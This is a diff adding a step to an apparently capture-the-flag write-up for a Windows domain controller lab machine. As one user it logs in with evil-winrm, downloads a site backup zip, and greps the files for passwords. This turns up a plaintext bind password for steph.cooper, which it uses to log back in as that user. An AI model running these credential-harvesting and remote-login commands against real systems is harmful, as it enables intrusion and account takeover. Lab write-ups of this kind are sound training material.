@@ -364,3 +364,43 @@ evil-winrm -i 10.129.232.75 -u  adam.silver -p 'ChangeMe123!'
 ```
 
 ## adam.silver -> steph.cooper
+
+Once we are logged into the DC as adam.silver, we will navigate to the C:\Backups folder and download site-backup-2024-12-30.zip:
+
+```
+cd C:/backups
+download site-backup-2024-12-30.zip
+```
+
+#### Output:
+
+```
+Info: Downloading C:\backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
+                                        
+Info: Download successful!
+```
+
+Then on our attacker host, we will extract the zip file contents, and then run grep to search for possible passwords:
+
+```
+unzip site-backup-2024-12-30.zip
+grep -ir pass .
+```
+
+#### Output:
+
+```
+./puppy/nms-auth-config.xml.bak:        <bind-password>ChefSteph2025!</bind-password>
+```
+
+We have found the password for steph.cooper: ChefSteph2025!
+
+Now let's log back into the machine using evil-winrm:
+
+```
+evil-winrm -i 10.129.232.75 -u steph.cooper -p ChefSteph2025!
+```
+
+We are now steph on the DC.
+
+## steph.cooper -> steph.cooper_adm
